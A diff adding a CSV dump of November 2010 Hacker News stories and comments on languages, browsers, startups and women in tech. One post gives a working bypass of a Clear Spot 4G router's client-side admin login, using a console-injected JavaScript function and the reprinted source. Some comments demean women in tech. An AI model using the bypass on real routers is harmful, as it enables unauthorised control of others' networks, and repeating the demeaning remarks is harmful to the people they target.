@@ -1,0 +1,208 @@
+ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
+1893235,comment,1892300,1892482,0,0,nimms,,,"not at all.  and I'm a heterosexual male.<p>I think we spend too much time demonizing basic human sexuality, and not enough time accepting and understanding it.<p>removing all semi naked pictures off magazine covers will not change the fact that people find other people sexually attractive...what it will do is make people feel terrible for having natural feelings.<p>I say this as a sole male bought up in a feminist household.  It took me a long time to realise that looking at the opposite sex was not actually a thought crime.",1289462284
+1893233,comment,1892300,1892459,0,0,sp4rki,,,"Others have said it more eloquently, but it's simply that some women have a bone to pick and prefer to offload the burden of actually being good at their jobs, instead acquiring this sense of entitlement and superiority.<p>There are more men 'featured' in tech because women make a small part of the tech industry in general. Last time I checked women accounted to around 7% of of important roles in the tech industry and the number of female students of computer science was something close of 16/17%.<p>I've worked with women before on two occasions. The first one was a Php developer that was just plain awful, her code sucked, her attitude sucked, and whenever you tried to get her to mend her wrongdoings, the boss would come and ask you to just leave her alone because she loves to make claims of sex based discrimination. The second one was recently and she was one of the most amazing Java developers I've ever met, far better than most men. She was as geeky as could be, could joke with the boys all day (and freaking outdrink half of the men at night!), and she believed that ""women play the sex discrimination card when they're so bad they could be replaced by a monkey"". Honestly, it's the exact same thing as the just graduated mediocre programmer (not saying all recent graduates are mediocre, I'm targeting a specific group). They complain and complain about the unfairness of X and Y, but are seldom any good anyways.<p>It's simple stuff really. Since women are such a small part of the tech community, it's exponentially more probable that more men than women will stand out. On the bright side tough, the women that do stand out, stand out immensely. Oh and the kicker for my story in the past paragraph. The bad developer was really average looking (creeping into not good looking at all territory), while the good one was a stunning blond which would melt your heart in a second. C'est la vie.",1289462004
+1893232,comment,1892737,1892948,0,0,InclinedPlane,,,"0. Finding the sweet spot in balancing quality of experience and ship-date.<p>A lot of game developers are so scared of shipping late that they put out crap as soon as its even remotely stable. They spend most of their effort on the ship-cycle treadmill rather than making the ship-cycle subservient to their desire to make excellent games. The same goes for many other creative endeavors such as software, books, movies. It takes serious guts to take a look at something that is nearly ready to be put in a box and sold to customers, and that has a realistic and high chance of turning a profit, and to say ""no, it's not good enough"". Even more so when you don't have a clear plan how to ""fix"" it.<p>On the other hand, it's easy to give in to the temptations of perfectionism and put off shipping indefinitely. Valve has managed to strike a balance, actually managing to ship games people love even after significant rework and even after significant time-lags (Team Fortress 2 spent almost a decade in development).",1289461976
+1893231,story,,,40,33,e27sg,"Joojoo is dead",http://e27.sg/2010/11/11/the-joojoo-is-dead-but-fusion-garage-plans-new-products/,,1289461960
+1893230,comment,1893000,1893144,0,0,codefisher,,,"Mine was similar, Python Python C/Java.  Though there are half a dozen others that I am perfectly comfortable with.",1289461907
+1893229,story,,,1,1,siculars,"A NOSQL evening in Palo Alto",http://www.infinitegraph.com/information/a-nosql-evening-in-palo-alto.html,,1289461901
+1893227,comment,1893000,1893000,0,0,cowpewter,,,"Happiness language: Actionscript 3<p>Hack-it-out: Python<p>$$$: Sadly at the moment Javascript (ugh)<p>I realize in the current 'zomg everyone hates flash' environment my choice for happiness language might make people look at me a bit strange, but AS3 is really a nice language. As ECMA dialects go I would rather write for the AVM than the browser any day. And when I think in code, it's usually Actionscript. Three years of hard-core Flex hacking will do that.<p>Python shows some signs of edging its way in as a replacement for my brain-speak, but I sadly don't use enough in my job right now for it to take over.",1289461747
+1893226,story,,,3,0,resdirector,"$1.1bn wasted on solar power",http://www.smh.com.au/environment/climate-change/11bn-wasted-on-solar-power-20101110-17nrh.html,,1289461717
+1893224,comment,1892300,1893059,0,0,nimms,,,"and yet so few women respect geeks...",1289461607
+1893223,comment,1892205,1893138,0,0,ethan_,,,"What would the consequences be of not getting my stuff done at a crappy job?",1289461556
+1893222,comment,1891434,1891434,0,0,gcb,,,"Why every video on youtube is with 2g or 3g?<p>not a single 3gs so far",1289461556
+1893221,comment,1893000,1893000,0,0,mkramlich,,,"C is the only language that there's a strong argument for it being a fundamental language to know. Because almost every other language, OS and device driver is written in it. Not everything, of course, but it's a huge percentage.<p>I really <i>like</i> some other languages other than C. But it's hard for me to make as strong of a case for any other language as a ""must know"" language.",1289461547
+1893220,comment,1892300,1892640,0,0,Marticus,,,"Agreed. I'm pretty sure the message here was ""hey you can enhance things and this is usually the most common surgically-enhanced body part,"" not ""women are items and you should make sure to keep her in the kitchen lest she learn how to work a computer or something.""<p>According to sources I can find that actually seem legitimate, we have a toss-up between liposuction and <i>gasp</i> breast enhancement.",1289461425
+1893219,comment,1892300,1892494,0,0,mfukar,,,"But, that'll sell like crazy, dood!",1289461417
+1893218,story,,,2,0,jayphelps,"Show HN: How to hack a Clear Spot 4G (admin access to router)",,"Disclaimer: This is just for educational purposes to prove that you should never, ever, ever, EVER, use client-side ANYTHING to set sessions or check passwords.  Send the credentials server-side and keep it there. In reality, this exploit probably isn't a big deal, but just in case: I EXCEPT NO RESPONSIBILITY WHAT SO EVER. (After all, this is so easy it's retarded)<p>Okiedoke. So to start, you must be connected to the Clear Spot's wireless network.  If it's not password protected, this is simple.  If it's WEP protected (I've found most are) then it's almost as simple, and if it's WPA protected you have just a little bit more work.  I'm not going to go into explaining how to crack WEP/WPA.  You can find those details elsewhere. I haven't looked into remote access, but I assume it's behind quite a few proxies like cell phones.<p>Now that you're connected to the Clear Wi-Fi network, point your browser to http://192.168.0.1/.  From here you should see some basic information about the Clear device, a login section on the top, and links to navigate around.  You'll notice that they are all unavailable without admin access.<p>Using your favorite method, view the /js/common.js file and scroll down to the function hlogin().<p>The hlogin() function checks if the password field was just left empty, then calls lct_ajax_pok() with the password assigned to Endpassword.<p>Inside lct_ajax_pok() it sends an AJAX request to check if the password is correct and on completion, sends the results to check_pss().<p>check_pss() then checks if the response code was valid, it then sends the session id (sid) to send_sid().<p>Looking at send_sid(), you may be thinking this AJAX call verifies the session id against something server-side. Wrong. In fact, this function is actually sending a string that, until now, means nothing to the server.<p>In simple terms, it's SETTING the session ID through a client-side AJAX request. If you follow the rest of the functions, you'll see it setting a logged in cookie, etc.<p>What this means for us: if you just simply remove the conditional checking if the password was correct, the sessions ID will blindly get set and you become a <i>valid, logged in admin</i>..<p>So without further ado, all you have to do to gain full access is fire up your favorite debug console (I use Firebug) and inject the following modified function:<p><pre><code>    function check_pss(login_txt,vv)
+    {
+        send_sid(sid);
+    }
+</code></pre>
+Once it's injected, type literally ANY password into the Admin Login and hit OK.<p>Congrats. You are now admin and can do/change whatever you please. Enjoy.<p><pre><code>    --------------------------------------------
+    common.js - unmodified
+    --------------------------------------------
+
+    function lct_remember_timer()
+    {
+        $.ajax({
+            url: 'remember_timmer',
+            type: 'post'
+        });
+
+    }
+
+    function session_ok(session_txt)
+    {
+         if(session_txt.responseText == sid)
+         {       
+                if($(""#ID_RememberMe"").attr('checked'))
+                {
+                    $.cookie('lct_remember_me', 'prm', {expires: 365});
+                    var ps = $(""#ID_AdminPassword"")[0].value;
+                    $.cookie('lct_psw', ps, {expires: 365});
+                }
+                 $.cookie('ddddd', '', {expires: 365});
+                $.cookie('dddddddd', '', {expires: 365});
+                 $('#nonlogin').hide(150);
+                $('#loginuser').show(150);
+                $('#conDisConDiv').show(100);
+                lct_remember_timer();
+                isadmin = 1;
+                remtimer = setInterval('lct_remember_timer();',2000);
+                /*add by zhangzhitong for cannot enter advance page at 2009-10-16 start*/
+                if(!($.cookie('lct_remember_me') == ""prm""))
+                {
+                    ajax_time = setInterval('lct_ajax_timer();',5000);
+                }
+                /*add by zhangzhitong for cannot enter advance page at 2009-10-16 end*/
+         }
+         else if(session_txt.responseText == ""2"")
+         {
+            alert(common_js_admin_login_alert);
+         }
+         else
+         {
+            alert(common_js_creatsessionerror);
+         }
+
+    }
+
+    //for send ssid to server
+    function send_sid(sessionid)
+    {
+        $.ajax({
+                url: 'ajax_session?sid='+sessionid,
+                type: 'post',
+                complete: function (xhr) {
+                    session_ok(xhr);
+                }
+        });
+
+     }
+
+    //for check passwpord
+    function check_pss(login_txt,vv)
+    {
+         if(login_txt.responseText == ""1"" )
+         {
+              send_sid(sid);
+         }
+         else
+         {
+             if(vv == 1)
+             {
+                 alert(common_js_password_c_alert);
+             }
+             else
+             {
+                alert(common_js_invalid_password_alert); 
+             }
+
+         } 
+    }
+    
+    
+    //send ajax checl
+    function lct_ajax_pok(ajaxid,vv)
+    {
+        $.ajax({
+                url: 'ajax_request?'+ajaxid,
+                type: 'post',
+                complete: function (xhr) {
+                    check_pss(xhr,vv);
+                }
+        });
+    
+    }
+    
+    
+    //function for login
+    function hlogin()
+    {
+        var pss = $(""#ID_AdminPassword"")[0].value;
+        if(pss == """")
+        {
+            alert(""Password can not be empty"");    
+            return false;
+        }
+        lct_ajax_pok(""Endpassword=""+pss,0);
+    
+    }</code></pre>",1289461356
+1893217,story,,,57,7,rguzman,"Django 1.3 alpha 1 released",http://docs.djangoproject.com/en/dev/releases/1.3-alpha-1/,,1289461283
+1893216,comment,1892052,1892399,0,0,shib71,,,"As fashionable as it is to deride Flash, the vast majority find it quite stable. I believe a good Flash developer could produce a solid upload client for this service. I also believe that every developer on HN would use such a client without batting an eye.",1289461265
+1893214,story,,,3,0,abraham,"US government probing Google Street View after all",http://arstechnica.com/tech-policy/news/2010/11/new-us-probe-of-google-street-view-in-the-works.ars,,1289461192
+1893213,comment,1892300,1892459,0,0,mfukar,,,"Because it's easy to manipulate people like that. Have you ever been the subject of a sexual harassment lawsuit? Even though I haven't either, it's mighty ugly. And women always come on top, no matter what the final scenes of 'Disclosure' showed you.",1289461192
+1893212,comment,1893165,1893165,0,0,jiganti,,,"Looks like they took that book down, as the URL isn't working:<p><a href=""http://www.amazon.com/Pedophiles-Guide-Love-Pleasure-ebook/product-reviews/B0049U4CF6/ref=sr_1_1_cm_cr_acr_pop_hist_all?ie=UTF8&showViewpoints=1&qid=1289461076&sr=8-1"" rel=""nofollow"">http://www.amazon.com/Pedophiles-Guide-Love-Pleasure-ebook/p...</a>",1289461169
+1893211,comment,1892205,1892233,0,0,ethan_,,,"Good analogy. I can definitely relate to this feeling.<p>I like the idea of launching a minimum viable product and I have recently been keeping it in mind during my design/development cycles. The idea of focusing on maintaining velocity seems more appropriate for web apps. My project has a long learning curve and an inherently long feedback loop. The amount of boilerplate code required for something minimally usable is extremely high compared to that of a webapp.",1289461165
+1893210,story,,,6,0,bdr,"Django 1.3 alpha 1 released",http://www.djangoproject.com/weblog/2010/nov/11/13-alpha-1/,,1289461113
+1893209,comment,1892300,1892753,0,0,jamaicahest,,,"Would it have been equally offensive, had they used an anonymous penis? Or does equality only apply to women?",1289461103
+1893208,comment,1892052,1892477,0,0,zootm,,,"That's an interesting idea. The only problem I can see is that every segment needs to be min. 5MB, so you'd probably need to buffer an extra segment compared to the ""naive"" implementationto ensure the last segment is big enough.",1289461046
+1893207,comment,1892300,1892490,0,0,mfukar,,,"Finally, a voice of reason.<p>I think it's extremely hard for people not to project their own thoughts and background of abuse (mostly perceived, but also otherwise) on simple things like a picture, a work of art, or a book, while simultaneously invalidating the context it appears in.<p>Why, I'll never figure out.",1289461035
+1893206,comment,1892605,1893126,0,0,webwright,,,"My GOD yes.  400 milliseconds is big.  1000-2000 milliseconds is huge.  Details from Google and Bing (via the ever-awesome Brady Forrest):<p><a href=""http://radar.oreilly.com/2009/06/bing-and-google-agree-slow-pag.html"" rel=""nofollow"">http://radar.oreilly.com/2009/06/bing-and-google-agree-slow-...</a>",1289461028
+1893205,comment,1891009,1891025,0,0,d_r,,,"I'll have to second that. There's no reason to spend months debating ""should I choose language X or language Y?"" Don't choose the trendy one. Choose the one you're proficient in, and the one that will help you <i>ship</i>, as shipping is what matters here.<p>Two comments, though:<p>* I think startups shy away from Microsoft technologies due to potential costs. Yes, there are programs such as BizSpark, etc., but learning the open source stack can go very far if you're not on infinite budget. Also, I think it's a bit easier to hire people proficient in (insert OSS technology here) in Silicon Valley.<p>* Even if you will never use the other technologies (say, Clojure), you can benefit a great deal from learning new things. If nothing else, this will help you gain perspective into other ways people solve problems in the industry.",1289460960
+1893204,comment,1893000,1893000,0,0,nivertech,,,"* My own DSLs<p>* Erlang,Python,Octave/Matlab,awk<p>* C/C++,Java,JavaScript,VBScript,PHP,bash",1289460925
+1893203,story,,,1,0,gasull,"Malware that attacks specific processors rather than the operating system",http://www.technologyreview.com/blog/arxiv/25999/?ref=rss,,1289460916
+1893202,story,,,70,42,petercooper,"An interview with James Gosling : The Setup",http://james.gosling.usesthis.com/,,1289460894
+1893201,comment,1890080,1891159,0,0,enjo,,,"If it doesn't fit in the standard card slot in my wallet, I'll likely (politely) give it back and ask for an e-mail. I hate toting around oversized cards, and just feel wasteful throwing them in my pocket to be tossed later.",1289460878
+1893200,comment,1893194,1893194,0,0,chunkyslink,,,"Although not really involved in this project myself I work with and am friends with the people behind it (who are not HN members) but I know they would appreciate any feedback from this community.",1289460873
+1893199,comment,1892605,1893092,0,0,instcode,,,"I'm using 4.0 ""full-time"" and it's the nightly build :). The only thing you need is Compatibility Reporter extension. It's here: <a href=""https://addons.mozilla.org/en-US/firefox/addon/15003"" rel=""nofollow"">https://addons.mozilla.org/en-US/firefox/addon/15003</a>",1289460863
+1893198,comment,1893078,1893078,0,0,vankap,,,"In landscape mode, I would prefer to have the swiping area on the right/left side of the screen rather than at the center bottom (I use my dell streak mostly in landscape). It would be easier to reach as I would only be using my thumb for input.<p>Would be great if this could be made an option in the settings.",1289460835
+1893197,comment,1893000,1893000,0,0,buster,,,"Actually: no.<p>I don't get the reasoning behind this.
+If there should be some languages everyone should atleast now, it would be one of each of these categories:<p><pre><code>  hardware (asm or atleast some basic knowledge of how the thing works you program for)
+  low-level (C, good base for procedural programming)
+  high-level (java, good base for object oriented programming)
+  script (.pl, .py, lua, etc.)
+</code></pre>
+Somewhere in between there may be a functional languague (erlang, lisp, haskell, etc.) but i, myself, never needed one.
+What really came handy overall is to know some basic stuff (assembler) for insight in how stuff works, plus C knowledge because the tools, libraries and languages you use are likely based on C. Plus Java, because it's almost everywhere and some script language to get things done ;)",1289460781
+1893196,comment,1892300,1893015,0,0,jamaicahest,,,"The legal system here in Denmark requires you to be directly involved if you want to bring charges against someone, ie. you can't accuse someone of making racist comments unless they were about you. The law often has flaws and it does not translate directly to being emotionally offended, but it does politically. Disclaimer: IANAL.",1289460771
+1893195,comment,1892300,1892995,0,0,mfukar,,,"That's exactly what's being done by women too, in articles like the one posted, and it hasn't stopped anyone from sympathizing or the collective hypocritic outcry of the masses that are offended by public displays of parts of the human body.",1289460767
+1893194,story,,,3,2,chunkyslink,"pocketdiner.co.uk - the future of mobile restaurant websites",http://www.pocketdiner.co.uk/,,1289460578
+1893193,comment,1891725,1892817,0,0,whyenot,,,"Use larger bins (by week or month), and I think your results would look a lot less dismal.",1289460544
+1893192,comment,1892624,1892655,0,0,catch23,,,"It's usually cash.  They do it so that you'll actually spend it and be happy instead of just depositing it into your bank.  Googler friends of mine say it happens every year a few weeks before christmas.  This instance was unusual because the cash was given out so early.<p>A friend of mine also recalls a team who stuffs envelopes full of cash -- it's a lot of work stuffing 10,000 envelopes (this was for the MV offices)",1289460483
+1893191,comment,1892108,1892958,0,0,ianb,,,"Is Dalvik essentially such a fork?  Obviously with its own legal dangers as well.",1289460402
+1893190,comment,1893000,1893000,0,0,safij,,,"I guess ""Happiness language"" and ""Hack-it-Out"" might overlap.<p>Happiness - LISP is becoming a BLISS!!<p>Hacky     - Python :):)<p>Day Job   - Very sadly :( :( .... JAVA!!",1289460329
+1893189,story,,,2,0,minhajuddin,"R3t a rails3 template with devise mongoid rspec cucumber and more",http://minhajuddin.com/2010/11/11/r3t-a-rails3-template-with-devise-mongoid-rspec-cucumber-and-more/,,1289460218
+1893188,comment,1892300,1892300,0,0,jlees,,,"Oh god. I hated this cover when I got it at work. Wired just didn't consider its female readership at all with this cover.",1289460209
+1893187,comment,1891725,1892642,0,0,mavelikara,,,"Yes, but has anyone other than the Go development team claimed so? Even in Google, has anyone outside of the Go team mentioned using it for writing production systems?",1289460179
+1893186,comment,1892693,1892693,0,0,julianz,,,"That was fun. I live in the wrong country and don't need a new job though :)",1289460162
+1893185,comment,1892605,1893121,0,0,koenigdavidmj,,,"Funnily enough, that's why we got Firefox in the first place---they wanted a lightweight (browser part of) Mozilla.<p>Of course, SeaMonkey is pretty fast nowadays too.",1289460112
+1893184,comment,1889727,1889727,0,0,randm_prgrmr,,,"Can anyone briefly explain to me how a Blizzard authenticator works? I'd like to implement something like that for fun, but apparently my google-fu is weak. A link would also be good.<p>[If anyone cares, I bought some model rocket motors and a TI Launchpad, I have a modem and a landline... Dialing in a launch and requiring the use of an autheticator to do so sounds like great fun. My own pretend nukes.]",1289460106
+1893183,comment,1892852,1893037,0,0,riffraff,,,"is memory deduplication the KSM thingy released about a year ago?<p><a href=""http://git.kernel.org/?p=linux/kernel/git/stable/linux-2.6.32.y.git;a=blob;f=Documentation/vm/ksm.txt;h=262d8e6793a3e008c36bb39905f49634f9e570ae;hb=HEAD"" rel=""nofollow"">http://git.kernel.org/?p=linux/kernel/git/stable/linux-2.6.3...</a>",1289460089
+1893182,comment,1892605,1893126,0,0,fhars,,,"Yes. Two seconds is usually regarded as the rection time threshold where an ineractive system starts to turn into a batch system. It is long enough for the user to start to forget what he expects from the system or to think about swiching to another activity while the current one loads. That is also the reason why database transaction benchmarks are always defined by number of transactions per second at a response time of slightly under two seconds, that is the threshold where they can still claim that the benchmark measures something about a system that is actually usable in practice.<p>So cutting response times by a second from say two seconds to one second changes the percieved delays from barely tolereble to barely noticable, which is unually beneficial for interactive apps.",1289460088
+1893181,comment,1892605,1892909,0,0,instcode,,,"I'm very happy with the result. However, on some javascript intensive webpages, such as <a href=""https://console.aws.amazon.com/s3/home"" rel=""nofollow"">https://console.aws.amazon.com/s3/home</a>, it hangs the whole Firefox for a little while. Hopefully with a long timeline to the release, no such issues remained.",1289460078
+1893178,comment,1892567,1892567,0,0,jasonshen,,,"Thanks for checking this out guys. I think it's been a great experience - and I actually work in sales so I already deal with a great deal of rejection. I'll be writing a summary of my experiences soon so stay tuned ...",1289460050
+1893177,comment,1891709,1891709,0,0,jeberle,,,"Certainly one of these things should have been that the school was founded by Lee Berk, who thought the name ""Berklee"" was good in light of UC Berkeley!",1289460017
+1893176,comment,1892300,1893096,0,0,jamaicahest,,,"And why should we? Show me one craft where newbies are respected without proving their skills and I'll reconsider. I personally would like to see more women choosing careers in IT, not because we need something pretty to look at, but because they want to be in IT. No healthy industry can be all but exclusive to one gender.",1289460004
+1893175,comment,1892108,1892958,0,0,mhansen,,,"You can't because Oracle has the patents covering technologies that are needed to implement Java.",1289459991
+1893173,story,,,2,0,db42,"20 iPad competitors",http://www.zdnet.com/blog/btl/watch-list-20-ipad-competitors/40736?tag=content;search-results-rivers,,1289459896
+1893171,comment,1892016,1892016,0,0,siculars,,,"Google just went plaid for a lot of people.",1289459747
+1893170,comment,1892605,1893126,0,0,veidr,,,"Yes, certainly they do. Amazon even did that famous internal study showing that, other factors being equal, a page that loaded 200ms more slowly caused a statistically significant drop in revenue. (Even if end users aren't aware that they care, they care.)",1289459732
+1893169,comment,1892550,1892550,0,0,mfukar,,,"So, to summarize: Google managed to appear more intimidating to any and all its competitors (by giving everyone a 10% raise) and fuck up its public image, all in two days.<p>Zuckerberg must be laughing his ass off right now.",1289459712
+1893168,comment,1890506,1891210,0,0,derefr,,,"I would say that a RESTful URL is simply one that multiple verbs can be applied to. That is, e.g. GETing and POSTing against the URL do different things, thus making the URL the ""noun"" and the HTTP method the ""verb."" Completely orthogonal to whether the URL is human-readable.",1289459551
+1893167,story,,,2,0,xtacy,"Mozilla Labs: F1; fast link sharing",http://f1.mozillamessaging.com/,,1289459532
+1893166,comment,1893000,1893000,0,0,soitgoes,,,"For me it's:<p>Perl - Hacking<p>C# - Bread and Butter<p>Python - Happy<p>Although, there's quite a bit of overlap.",1289459508
+1893165,story,,,2,1,cwan,"Amazon: Books About Having Sex With Kids OK, But Porn Out Of Bounds",http://www.businessinsider.com/amazon-its-ok-to-write-books-about-having-sex-with-kids-but-porn-is-out-of-bounds-2010-11,,1289459480
+1893163,comment,1892550,1892993,0,0,mfukar,,,"That's not journalism.<p>OK, it may be <i>today's</i> journalism, but who trusts news sources like that?",1289459399
+1893162,story,,,1,0,mgdiaz,"Designing The Washington Post for iPad – Detailed Wireframes",http://www.sarahsampsel.com/blog/2010/11/10/designing-the-washington-post-for-ipad-detailed-wireframes/,,1289459379
+1893160,comment,1887771,1888952,0,0,SkyMarshal,,,"Good to hear, thanks.",1289459344
+1893159,comment,1893000,1893097,0,0,stcredzero,,,"Really?  I took it as a ""clever"" hack for flattering everyone that actually indicates the author has even more to learn.  To wit: there's a lot more relativism involved that one might expect at first inspection.<p>For me, Perl would be a ""keep me alive"" language.  Yet I recognize that there's a lot of truly esoteric and impressive stuff in Perl.  My ""bread and butter"" and my ""hack it out"" has been Smalltalk, which to a lot of people would be an esoteric ""happiness"" language.  As it happens, it's a language with substantial libraries with which one can get some serious work done.  Many languages have played two or all three roles for many different people.  Also, lacking a ""bread and butter"" language is not a sign that someone has difficulty working in teams.  It can also be a sign that someone is very good at navigating career pitfalls.<p>Often what a programmer thinks of a language and how they use it really says more about the programmer than it does about the language.",1289459334
+1893158,story,,,1,0,jiganti,Isildur1,http://en.wikipedia.org/wiki/Isildur1,,1289459301
+1893157,comment,1891660,1892257,0,0,modeless,,,"Completely wrong.  Kinect is <i>not</i> a stereo vision system.  It's the first consumer application of a completely new class of cameras which directly measures depth by the time of flight of a reflected laser beam.  It's literally a 320x240 array of laser rangefinders.  It's called a flash LIDAR camera, and the quality and robustness of the depth data is far beyond anything achievable from stereo vision today even with high-end cameras, let alone webcams.<p>edit: Actually, there seems to be some confusion on the Internet about exactly how Kinect's depth sensor works, and it may be more likely based on structured light scanning than LIDAR (though Microsoft has recently acquired some LIDAR startups).  Either way, though, the depth data quality is far beyond any kind of stereo vision.",1289459259
+1893155,story,,,2,0,sciboy,"Ask HN: Would this solve FB/Google Contacts issues?",,"With all the furor about google & facebook email ownership, what I propose is a simple browser plugin that collects and manages facebook data for you while you are on the site. The plugin would grab your friends page urls, emails & other data and save it locally. Then this plugin can be used to reconstruct your social graph outside of facebook (diaspora?), and could be potentially imported into other services.<p>While I can see the downside, if a user currently has access to your information via your permission they could do this manually, therefore this is entirely within your right as a user. This would simply make the process simpler.<p>Perhaps someone should build this as if it took off it would simplify the transition to facebook.next<p>Thoughts?",1289459139
+1893154,story,,,5,0,r11t,"High-Performance Server Architecture",http://pl.atyp.us/content/tech/servers.html,,1289459136
+1893153,comment,1891709,1891825,0,0,angrycoder,,,"There is a banner hanging up in the studio I train at: ""Hard work beats talent when talent doesn't work hard.""",1289459122
+1893152,comment,1891753,1893101,0,0,dgreensp,,,"Agreed.  If red=255 looks brighter on your monitor than blue=255, well, that's how the monitor was designed!",1289459107
+1893151,comment,1893000,1893000,0,0,SkyMarshal,,,"One of the best related comments I've seen on this topic was by coffeemug a few weeks ago:<p><a href=""http://news.ycombinator.com/item?id=1747713"" rel=""nofollow"">http://news.ycombinator.com/item?id=1747713</a><p><i>""1. Be good. Be very good. Don't be the ""front-end guy"" or the ""back-end guy"", or some other ""guy"". Once you know what you want to build, building software is about five things: algorithms that solve your problem, programming languages that express your algorithms, computer architecture that makes your algorithms run efficiently on real hardware, the practical toolchain, and the management of complexity of real software. So study algorithms, and then graduate algorithms, and then advanced graduate algorithms. Do every challenge problem online. Study programming languages to express those algorithms. You can get away with three: C, Lisp, Haskell. Everything else is crud.
+...""</i><p>I interpreted that to mean that C, Lisp, and Haskell are best at expressing the most difficult algorithms and concepts in computer science and software engineering, while simultaneously giving one the conceptual understanding and ability to quickly use easier languages like Python or Ruby for glue, utility, etc.",1289459063
+1893150,comment,1890164,1892496,0,0,chrischen,,,"> You can make your email private in Facebook and you do not have to friend people. I would argue for a downloadable list of contacts/email address whose emails you have access to. Facebook already allows hotmail+yahoo access to the email lists, the individual user can not download it directly.<p>I friend people based on the assumption that they can't export my email to arbitrary third parties (which is true at the moment). If this is no longer true I would delete all my friends, sue facebook, and meet friends in person to socialize. But the other thing you mention is reasonable. But it would have to be opt-in since by default I don't think people would want this. Also since originally signing up this feature was not implied.",1289459045
+1893149,comment,1892567,1892790,0,0,catch23,,,"did a small biz startup sometime ago.  doing cold calling sales pitches to small restaurants will make you immune to rejection in a week.",1289459039
+1893148,comment,1892605,1893115,0,0,sliverstorm,,,"I have begun testing, and I can report it is drastically improved.",1289459006
+1893147,comment,1891753,1892339,0,0,evilduck,,,"Furthering this, I've also read (but can't cite off hand) that it's evolutionary.<p>A good chunk of the world is green, ripeness of fruits and vegetables can be determined at a distance by detecting green, and moonlight reflecting off of stuff will likely be green more than other colors, enabling the cones to do some of the night vision work besides the rods. Conversely, the only major blue things in nature tend to be the sky and flowers, neither of which provide a significant survival advantage. Interestingly, some women may actually be tetrachromats, giving them incredible ability to differentiate reds.<p>Also...I can't recall the exact reason, but we have trouble focusing on blues as well (wavelengths maybe?).  If you have one nearby, one night go park near the middle of the lot of a Petsmart, which has a bright red/blue sign.  Look at the sign while moving your head left and right, the blue letters will appear to move while the red remain stationary.",1289458932
+1893146,comment,1893000,1893000,0,0,ryanwaggoner,,,"I've got my bread-and-butter (PHP) and Python is rapidly becoming my Hack-it-out / GTD language, but I don't have a happiness language. However, Python is making me pretty damn happy...maybe that means I'm just a practical programmer.",1289458925
+1893145,comment,1893000,1893000,0,0,endlessvoid94,,,"Seriously, Python fits the bill for all three categories for me.",1289458922
+1893144,comment,1893000,1893141,0,0,hartror,,,"Yeah that was my answer:<p>Python
+Python
+Python",1289458909
+1893143,comment,1890164,1892858,0,0,chrischen,,,"Well if your friends imported their Facebook data into Buzz or Twitter then it should be possible.",1289458891
+1893142,comment,1892605,1892960,0,0,wahnfrieden,,,"I don't know about your predictions, but I think that Google's Native Client for Chrome will be a significant differentiator in bridging the desktop/web app gap once it matures and gains traction, with the help of Chrome OS too. Mozilla has some ideas for this sort of thing -- Prism is a barely-alive project that makes desktop apps out of sites and gives extra privileges and desktop APIs to the JavaScript client. I wonder if they would or can just take NaCl from Google too though, or make their own compatible platform based on LLVM.",1289458858
